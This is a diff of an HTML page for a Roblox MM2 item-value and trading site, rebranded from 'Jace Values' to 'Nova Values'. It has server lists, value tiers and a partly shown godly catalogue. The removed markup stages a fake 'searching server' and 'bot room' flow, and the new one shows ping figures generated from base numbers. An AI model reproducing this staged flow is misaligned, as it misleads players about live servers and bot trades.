+  .modal-trade-summary .mts-arrow{flex-basis:100%;transform:rotate(90deg);margin:2px 0}
+}
+.modal-ticket-ref{font-size:11px;letter-spacing:1px;color:var(--cyan);font-weight:800;margin:-8px 0 14px}
+.login-note{font-size:11px!important;margin-top:12px!important;margin-bottom:0!important;color:#687890!important}
+.history-wrap{max-width:650px;margin:0 auto}
+.history-empty{text-align:center;color:#66748c;font-size:13px;padding:40px 0}
+.history-card{
+  background:linear-gradient(145deg,#101b2e,#0e1628);border:1px solid #203652;
+  border-radius:14px;padding:14px 16px;margin-bottom:10px;
+}
+.history-head{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:8px}
+.history-ref{font-family:"Barlow Condensed",sans-serif;letter-spacing:1px;color:var(--cyan);font-weight:800;font-size:15px}
+.history-date{font-size:10px;color:#66748c}
+.history-user{font-size:12px;color:#c7d0e0;margin-bottom:6px}
+.history-stars{font-size:14px;color:#3a4059;letter-spacing:2px}
+.history-stars .filled{color:#ffcf4d}
 </style>
 </head>
 <body>
 
-<header>
-  <div class="logo">
-    <img src="https://jacevalues.com/images/jace.png" alt="Jace Values">
-    <div>
-      jacevalues.com<span class="tm">™</span>
-      <div class="tagline">Your MM2 trade space, the number one place. Powered by Jace.</div>
+<header class="topbar">
+  <div class="brand">
+    <!-- THIS WHERE U CHANGE LOGO IMAGE (src below) -->
+    <img class="logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGMfqbI4vWh3OgIovspkJYWDeYHpVKEb7IJkImo7jTaA&s=10" alt="Logo">
+    <div class="theme-switcher" id="themeSwitcher">
+      <button class="theme-btn" id="themeCycleBtn" title="Switch theme">🌌</button>
     </div>
   </div>
-  <nav class="tabs">
-    <a href="#news">News</a>
-    <a href="#servers" class="active">Servers</a>
-    <a href="#values">Values</a>
-    <a href="#swap">Swap</a>
+  <nav class="menu">
+    <button class="nav-btn" data-page="news">News</button>
+    <button class="nav-btn" data-page="servers">Servers</button>
+    <button class="nav-btn" data-page="values">Values</button>
+    <button class="nav-btn active" data-page="swap">Swap</button>
+    <button class="nav-btn" data-page="history">History</button>
   </nav>
 </header>
 
-<!-- ================= NEWS ================= -->
-<section id="news">
-  <div class="banner">
-    <span class="pill">🔥 SWAP SYSTEM LIVE</span>
-    <h1>THE SWAP SYSTEM HAS ARRIVED</h1>
-    <p>Trade with the Jace bot like a VIP. Private bot links mean no public lobbies,
-       no scammers — just you, the bot, and the trade.</p>
-    <ul class="features">
-      <li>All 178 godlies with live gem values</li>
-      <li>Stack any godly from x1 to x99</li>
-      <li>Private bot links</li>
-      <li>Instant swap confirmation</li>
-    </ul>
-    <div class="stats">
-      <div><div class="num">178</div><div class="lbl">godlies</div></div>
-      <div><div class="num">5</div><div class="lbl">value tiers</div></div>
-    </div>
-    <a class="btn-primary" href="#swap">START SWAPPING</a>
-  </div>
+<main class="page">
 
-  <div class="banner">
-    <span class="pill">📢 NEW ANNOUNCEMENT</span>
-    <h1>JAPAN SERVERS ARE BOOMING!!! ▼</h1>
-    <p>Japan servers are getting insanely popular — new traders join every day and
-       players are scoring the best deals on our fastest servers.</p>
-    <ul class="features">
-      <li>Fixed network latency</li>
-      <li>Optimized Japan servers</li>
-      <li>Lowered ping in all servers</li>
-      <li>More players online than ever</li>
-    </ul>
-    <div class="stats">
-      <div><div class="num">224</div><div class="lbl">players online</div></div>
-      <div><div class="num">3</div><div class="lbl">Japan servers</div></div>
-    </div>
-    <a class="btn-primary" href="#servers">JOIN JAPAN SERVERS</a>
+<section id="news" class="page-section">
+  <div class="hero">
+    <h1>NOVA VALUES</h1>
+    <p>A clean community hub for values, servers and swapping.</p>
   </div>
-</section>
-
-<!-- ================= SERVERS ================= -->
-<section id="servers">
-  <div class="region">
-    <h2>North America ▼</h2>
-    <div class="meta">74 players online · 8 servers</div>
-
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Portland</span>
-      <span class="ping">52 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - San Mateo</span>
-      <span class="ping">44 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Palo Alto</span>
-      <span class="ping">55 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Los Angeles</span>
-      <span class="ping">45 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Dallas</span>
-      <span class="ping">56 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Chicago</span>
-      <span class="ping">31 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - New York City</span>
-      <span class="ping">42 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-    <div class="server-card">
-      <img class="flag" src="https://jacevalues.com/flags/usa.png" alt="USA">
-      <span class="name">United States - Newark</span>
-      <span class="ping">44 ms</span>
-      <button class="btn-join" onclick="openServerFlow()">Join</button>
-    </div>
-  </div>
-</section>
-
-<!-- ================= VALUES ================= -->
-<section id="values">
-  <div class="tier">
-    <h3>TIER 5 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Harvester.png" alt=""><span class="vname">Harvester</span><span class="vval">💎 150</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ElderwoodRevolver.png" alt=""><span class="vname">Elderwood Gun</span><span class="vval">💎 145</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Elderwood_Scythe.png" alt=""><span class="vname">Elderwood Scythe</span><span class="vval">💎 97</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/HallowscytheUp.png" alt=""><span class="vname">Hallow's Scythe</span><span class="vval">💎 96</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Flowerwood_Gun.png" alt=""><span class="vname">Flowerwood Gun</span><span class="vval">💎 95</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ElderwoodBlade.png" alt=""><span class="vname">Elderwood Blade</span><span class="vval">💎 95</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Snowstorm.png" alt=""><span class="vname">Snowstorm</span><span class="vval">💎 94</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IceDragonUp.png" alt=""><span class="vname">Ice Dragon</span><span class="vval">💎 92</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Blizzard%20(2).png" alt=""><span class="vname">Blizzard</span><span class="vval">💎 90</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/HallowsbladeUP.png" alt=""><span class="vname">Hallow's Blade</span><span class="vval">💎 90</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 4 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/SunsetKnife.png" alt=""><span class="vname">Sunset</span><span class="vval">💎 88</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/FrostbiteUP.png" alt=""><span class="vname">Frostbite</span><span class="vval">💎 88</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/WaterGun.png" alt=""><span class="vname">Watergun</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/hallowgunup.png" alt=""><span class="vname">Hallowgun</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/FlamesUp.png" alt=""><span class="vname">Flames</span><span class="vval">💎 85</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Rainbowblade.png" alt=""><span class="vname">Rainbow</span><span class="vval">💎 80</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Alienbeam.png" alt=""><span class="vname">Alienbeam</span><span class="vval">💎 78</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/rainbowgun.png" alt=""><span class="vname">Rainbow Gun</span><span class="vval">💎 78</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Xenoshot.png" alt=""><span class="vname">Xenoshot</span><span class="vval">💎 76</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Xenoknife.png" alt=""><span class="vname">Xenoknife</span><span class="vval">💎 74</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/2024Constellation.png" alt=""><span class="vname">Constellation</span><span class="vval">💎 70</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Red_Luger.png" alt=""><span class="vname">Red Luger</span><span class="vval">💎 70</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 3 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Evergun.png" alt=""><span class="vname">Evergun</span><span class="vval">💎 65</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Raygun.png" alt=""><span class="vname">Raygun</span><span class="vval">💎 65</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/TravGun.png" alt=""><span class="vname">Traveler's Gun</span><span class="vval">💎 62</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Chroma_Snow_Dagger.png" alt=""><span class="vname">Snow Dagger</span><span class="vval">💎 62</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IceblasterUP.png" alt=""><span class="vname">Iceblaster</span><span class="vval">💎 61</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/spirit.png" alt=""><span class="vname">Spirit</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/ewrev.png" alt=""><span class="vname">Elderwood Revolver</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Chroma_Boneblade.png" alt=""><span class="vname">Boneblade</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/TravellersAxe.png" alt=""><span class="vname">Traveler's Axe</span><span class="vval">💎 60</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Bat_Zombie.png" alt=""><span class="vname">Bat</span><span class="vval">💎 56</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/soul.png" alt=""><span class="vname">Soul</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Snow_Dagger.png" alt=""><span class="vname">Snow Dagger</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/chromaseer.png" alt=""><span class="vname">Seer</span><span class="vval">💎 55</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Makeshift.png" alt=""><span class="vname">Makeshift</span><span class="vval">💎 51</span></div>
-    </div>
-  </div>
-  <div class="tier">
-    <h3>TIER 1 ▼</h3>
-    <div class="values-grid">
-      <div class="value-card"><img src="https://jacevalues.com/godlies/Icebreaker.png" alt=""><span class="vname">Icebreaker</span><span class="vval">💎 48</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/IcewingknifeUp.png" alt=""><span class="vname">Icewing</span><span class="vval">💎 42</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/BonebladeUP.png" alt=""><span class="vname">Boneblade</span><span class="vval">💎 33</span></div>
-      <div class="value-card"><img src="https://jacevalues.com/godlies/yellowseer.png" alt=""><span class="vname">Yellow Seer</span><span class="vval">💎 14</span></div>
-    </div>
-  </div>
-</section>
-
-<!-- ================= SWAP ================= -->
-<section id="swap">
-  <div class="swap-box">
-    <h2>Jace Swap</h2>
-    <div class="sub">Your value must be equal or greater than bot's value</div>
-    <div class="swap-cols">
-      <div class="swap-col">
-        <h4>YOU GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">++++</div>
+  <div class="news-wrap">
+    <article class="news-card">
+      <span class="badge" style="background:rgba(45,212,191,.15);color:#2dd4bf;border:1px solid rgba(45,212,191,.35)">💠 SWAP SYSTEM LIVE</span>
+      <h2 style="background:linear-gradient(90deg,#2dd4bf,#818cf8);-webkit-background-clip:text;background-clip:text;color:transparent">THE SWAP SYSTEM HAS ARRIVED</h2>
+      <p>Trade with the Jace bot like a VIP. Private bot links mean no public lobbies, no scammers — just you, the bot, and the trade.</p>
+      <ul>
+        <li>All 178 godlies with live gem values</li>
+        <li>Stack any godly from x1 to x99</li>
+        <li>Private bot links</li>
+        <li>Instant swap confirmation</li>
+      </ul>
+      <div style="display:flex;gap:8px;margin:4px 0 16px">
+        <span style="display:inline-flex;align-items:baseline;gap:5px;background:rgba(255,255,255,.04);border:1px solid #263653;border-radius:10px;padding:8px 14px"><b style="font-size:15px;color:#fff">178</b><span style="font-size:12px;color:var(--muted)">godlies</span></span>
+        <span style="display:inline-flex;align-items:baseline;gap:5px;background:rgba(255,255,255,.04);border:1px solid #263653;border-radius:10px;padding:8px 14px"><b style="font-size:15px;color:#fff">5</b><span style="font-size:12px;color:var(--muted)">value tiers</span></span>
       </div>
-      <div class="swap-arrow">⇄</div>
-      <div class="swap-col">
-        <h4>BOT GIVE</h4>
-        <div class="gem">💎 0</div>
-        <div class="plus">▲▼</div>
+      <button class="primary start-swap" style="height:38px;background:linear-gradient(135deg,#2dd4bf,#0ea5e9);color:#06121b">START SWAPPING</button>
+    </article>
+    <article class="news-card">
+      <span class="badge">📢 NEW ANNOUNCEMENT</span>
+      <h2>WELCOME TO NOVA VALUES</h2>
+      <p>Browse the value list and server layout below.</p>
+    </article>
+  </div>
+</section>
+
+<section id="servers" class="page-section">
+  <div class="hero"><h1>SERVERS</h1><p>Server list interface — connect your own data later.</p></div>
+  <!-- REDIRECT #1 (SERVERS PAGE): each "Join" button opens Roblox in a
+       new tab. See '#serverList .join' click handler near the bottom. -->
+  <div class="server-list" id="serverList">
+    <div class="server">
+      <div class="server-head">Asia <span>▼</span></div>
+      <div class="server-body">
+        <div class="server-row"><b>Japan - Tokyo</b><span class="ping" data-base="42"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Singapore</b><span class="ping" data-base="51"></span><button class="join">Join</button></div>
       </div>
     </div>
-    <div style="margin-top:26px;">
-      <button class="btn-primary" onclick="openTicketFlow()">SWAP IT</button>
+    <div class="server">
+      <div class="server-head">Europe <span>▼</span></div>
+      <div class="server-body">
+        <div class="server-row"><b>Ireland - Dublin</b><span class="ping" data-base="52"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>France - Paris</b><span class="ping" data-base="39"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>United Kingdom - London</b><span class="ping" data-base="46"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Germany - Frankfurt</b><span class="ping" data-base="49"></span><button class="join">Join</button></div>
+      </div>
+    </div>
+    <div class="server collapsed">
+      <div class="server-head">North America <span>▼</span></div>
+      <div class="server-body">
+        <div class="server-row"><b>United States - New York</b><span class="ping" data-base="18"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>United States - Los Angeles</b><span class="ping" data-base="27"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>United States - Chicago</b><span class="ping" data-base="22"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Canada - Toronto</b><span class="ping" data-base="25"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Mexico - Mexico City</b><span class="ping" data-base="35"></span><button class="join">Join</button></div>
+      </div>
+    </div>
+    <div class="server collapsed">
+      <div class="server-head">South America <span>▼</span></div>
+      <div class="server-body">
+        <div class="server-row"><b>Brazil - São Paulo</b><span class="ping" data-base="58"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Argentina - Buenos Aires</b><span class="ping" data-base="64"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Chile - Santiago</b><span class="ping" data-base="67"></span><button class="join">Join</button></div>
+        <div class="server-row"><b>Colombia - Bogotá</b><span class="ping" data-base="61"></span><button class="join">Join</button></div>
+      </div>
     </div>
   </div>
 </section>
 
-<!-- ================= MODALS ================= -->
-
-<!-- Searching server -->
-<div class="overlay" id="ovSearching">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching" id="searchLabel">Searching server...</p>
+<section id="values" class="page-section">
+  <div class="hero"><h1>VALUES</h1><p>Sample value cards. Replace images, names and values with your own data.</p></div>
+  <div class="searchbar">
+    <input id="valuesSearch" placeholder="Search godlies...">
+    <button id="sortBtn">Sort: Tiers</button>
   </div>
-</div>
 
-<!-- Server found -->
-<div class="overlay" id="ovServerFound">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovServerFound')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>Server Found!</h3>
-    <div class="bot-room">Bot room: <span id="roomCode">#A3T-892</span> · 8/12 online</div>
-    <button class="btn-primary" onclick="closeOverlay('ovServerFound'); openOverlay('ovKickWarn');">Join Server</button>
+  <div id="tiersView"></div>
+  <div id="valueView" class="grid" style="display:none"></div>
+
+  <div id="tiersSource" style="display:none">
+  <div class="section-title">Tier 5 <span class="count">36</span></div>
+  <div class="grid">
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SwirlyBladeUP.png" alt="Swirly Blade"><div class="item-name">Swirly Blade</div><div class="item-value">💎 3159</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/NebulaUp.png" alt="Nebula"><div class="item-name">Nebula</div><div class="item-value">💎 1535</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/harvester.png" alt="Harvester"><div class="item-name">Harvester</div><div class="item-value">💎 1405</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/JinglegunUP.png" alt="Jingle Gun"><div class="item-name">Jingle Gun</div><div class="item-value">💎 1315</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BatwingUpdated.png" alt="Batwing"><div class="item-name">Batwing</div><div class="item-value">💎 980</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaSunsetKnife.png" alt="Sunset"><div class="item-name">Sunset</div><div class="item-value">💎 810</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceShardUP.png" alt="Ice Shard"><div class="item-name">Ice Shard</div><div class="item-value">💎 805</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SpiderUP.png" alt="Spider"><div class="item-name">Spider</div><div class="item-value">💎 750</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/PixelUp.png" alt="Pixel"><div class="item-name">Pixel</div><div class="item-value">💎 690</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/GemstoneUP.png" alt="Gemstone"><div class="item-name">Gemstone</div><div class="item-value">💎 670</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaswirlygun.png" alt="Swirly Gun"><div class="item-name">Swirly Gun</div><div class="item-value">💎 665</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/eternalcane.png" alt="Eternal Cane"><div class="item-name">Eternal Cane</div><div class="item-value">💎 650</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Gingerblade.png" alt="Gingerblade"><div class="item-name">Gingerblade</div><div class="item-value">💎 645</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SwirlGunUP.png" alt="Swirly Gun"><div class="item-name">Swirly Gun</div><div class="item-value">💎 640</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Gingermint.png" alt="Gingermint"><div class="item-name">Gingermint</div><div class="item-value">💎 630</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/redseer.png" alt="Red Seer"><div class="item-name">Red Seer</div><div class="item-value">💎 625</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromads.png" alt="Death Shard"><div class="item-name">Death Shard</div><div class="item-value">💎 610</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/purpleseer.png" alt="Purple Seer"><div class="item-name">Purple Seer</div><div class="item-value">💎 610</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Plasmablade.png" alt="Plasmablade"><div class="item-name">Plasmablade</div><div class="item-value">💎 605</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CBauble.png" alt="Bauble"><div class="item-name">Bauble</div><div class="item-value">💎 595</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Plasmabeam.png" alt="Plasmabeam"><div class="item-name">Plasmabeam</div><div class="item-value">💎 585</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Bauble.png" alt="Bauble"><div class="item-name">Bauble</div><div class="item-value">💎 575</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/DeathshardUp.png" alt="Death Shard"><div class="item-name">Death Shard</div><div class="item-value">💎 560</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LogchopperUp.png" alt="Logchopper"><div class="item-name">Logchopper</div><div class="item-value">💎 560</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BattleAxe2UP.png" alt="Battle Axe II"><div class="item-name">Battle Axe II</div><div class="item-value">💎 555</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/MintyUp.png" alt="Minty"><div class="item-name">Minty</div><div class="item-value">💎 550</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SwirlAxe.png" alt="Swirly Axe"><div class="item-name">Swirly Axe</div><div class="item-value">💎 545</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromacandle.png" alt="Candleflame"><div class="item-name">Candleflame</div><div class="item-value">💎 540</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaTravGun.png" alt="Traveler's Gun"><div class="item-name">Traveler's Gun</div><div class="item-value">💎 539</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Spectre.png" alt="Spectre"><div class="item-name">Spectre</div><div class="item-value">💎 530</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Phantom_Shop.png" alt="Phantom"><div class="item-name">Phantom</div><div class="item-value">💎 520</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Ginger_LugerUP.png" alt="Ginger Luger"><div class="item-name">Ginger Luger</div><div class="item-value">💎 515</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LugerUpdated.png" alt="Luger"><div class="item-name">Luger</div><div class="item-value">💎 512</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HeartBladeUp.png" alt="Heart Blade"><div class="item-name">Heart Blade</div><div class="item-value">💎 505</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BlossomGun.png"><div class="item-name">Blossom</div><div class="item-value">💎 502</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Sakura.png" alt="Sakura"><div class="item-name">Sakura</div><div class="item-value">💎 501</div></div>
   </div>
-</div>
 
-<!-- Kick warning -->
-<div class="overlay" id="ovKickWarn">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovKickWarn')">✕</button>
-    <img class="kick" src="https://jacevalues.com/images/kick.png" alt="">
-    <p>If you have an <b>empty inventory</b>, our bots will detect it and kick you.</p>
-    <p>Our servers are <b>PRIVATE</b> servers, meaning you can get kicked.</p>
-    <p>If your account is new/not level 10, you may not be able to join at all.</p>
-    <button class="btn-primary" onclick="closeOverlay('ovKickWarn'); openOverlay('ovJoinBot');">Continue</button>
+  <div class="section-title">Tier 4 <span class="count">52</span></div>
+  <div class="grid">
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Evergreen.png" alt="Evergreen"><div class="item-name">Evergreen</div><div class="item-value">💎 495</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaheat.png" alt="Heat"><div class="item-name">Heat</div><div class="item-value">💎 495</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HeatUP.png" alt="Heat"><div class="item-name">Heat</div><div class="item-value">💎 485</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaslasher.png" alt="Slasher"><div class="item-name">Slasher</div><div class="item-value">💎 485</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SlasherUP.png" alt="Slasher"><div class="item-name">Slasher</div><div class="item-value">💎 475</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ClockworkUp.png" alt="Clockwork"><div class="item-name">Clockwork</div><div class="item-value">💎 475</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/OldGloryUp.png" alt="Old Glory"><div class="item-name">Old Glory</div><div class="item-value">💎 468</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromagem.png" alt="Gemstone"><div class="item-name">Gemstone</div><div class="item-value">💎 465</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaCookiecane.png" alt="Cookiecane"><div class="item-name">Cookiecane</div><div class="item-value">💎 460</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Cookiecane.png" alt="Cookiecane"><div class="item-name">Cookiecane</div><div class="item-value">💎 450</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/VampiresedgeUP.png" alt="Vampire's Edge"><div class="item-name">Vampire's Edge</div><div class="item-value">💎 440</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Battleaxe1UP.png" alt="Battle Axe"><div class="item-name">Battle Axe</div><div class="item-value">💎 435</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromasaw.png" alt="Saw"><div class="item-name">Saw</div><div class="item-value">💎 430</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChillUpdated4.png" alt="Chill"><div class="item-name">Chill</div><div class="item-value">💎 420</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/VirtualUP.png" alt="Virtual"><div class="item-name">Virtual</div><div class="item-value">💎 415</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SawUP.png" alt="Saw"><div class="item-name">Saw</div><div class="item-value">💎 410</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Lightbringer.png" alt="Lightbringer"><div class="item-name">Lightbringer</div><div class="item-value">💎 395</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Handsaw_Png.png" alt="Handsaw"><div class="item-name">Handsaw</div><div class="item-value">💎 385</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LightbringerUpdated.png" alt="Lightbringer"><div class="item-name">Lightbringer</div><div class="item-value">💎 380</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromafang.png" alt="Fang"><div class="item-name">Fang</div><div class="item-value">💎 380</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BlasterUP.png" alt="Blaster"><div class="item-name">Blaster</div><div class="item-value">💎 370</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromatides.png" alt="Tides"><div class="item-name">Tides</div><div class="item-value">💎 370</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromalaser.png" alt="Laser"><div class="item-name">Laser</div><div class="item-value">💎 365</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Eternal4UP.png" alt="Eternal IV"><div class="item-name">Eternal IV</div><div class="item-value">💎 355</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Celestial.png" alt="Celestial"><div class="item-name">Celestial</div><div class="item-value">💎 355</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LaserUpdated.png" alt="Laser"><div class="item-name">Laser</div><div class="item-value">💎 352</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/FangUp.png" alt="Fang"><div class="item-name">Fang</div><div class="item-value">💎 348</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/candleflame.png" alt="Candleflame"><div class="item-name">Candleflame</div><div class="item-value">💎 345</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/TidesUP.png" alt="Tides"><div class="item-name">Tides</div><div class="item-value">💎 342</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromashark.png" alt="Shark"><div class="item-name">Shark</div><div class="item-value">💎 340</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceFlakeUP.png" alt="Iceflake"><div class="item-name">Iceflake</div><div class="item-value">💎 322</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SharkUP.png" alt="Shark"><div class="item-name">Shark</div><div class="item-value">💎 315</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Icepiercer.png" alt="Icepiercer"><div class="item-name">Icepiercer</div><div class="item-value">💎 310</div></div>
